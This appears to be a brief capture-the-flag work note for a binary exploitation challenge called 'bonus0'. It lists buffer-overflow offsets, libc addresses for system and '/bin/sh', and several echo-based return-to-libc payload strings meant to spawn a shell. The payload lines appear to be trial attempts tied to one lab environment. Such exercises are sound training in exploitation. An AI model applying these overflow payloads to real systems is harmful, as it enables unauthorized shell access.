# bonus0

## Useful infos

first string: `AAAABBBBCCCCDDDDEEEE`
second string `11112222333344445555`
segfaults on call to `0x34333333` -> `111122223[3334]4445555`
address of system: `0xb7e6b060` -> `\x60\xb0\xe6\xb7`
address of "/bin/sh": `0xb7f8cc59` -> `\x59\xcc\xf8\xb7`

exploit: `echo -e "111122223\x60\xb0\xe6\xb74445555"`
exploit: `echo -e "\x59\xcc\xf8\xb7\x59\xcc\xf8\xb73\x60\xb0\xe6\xb7444555"`
exploit: `echo -e "\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7"`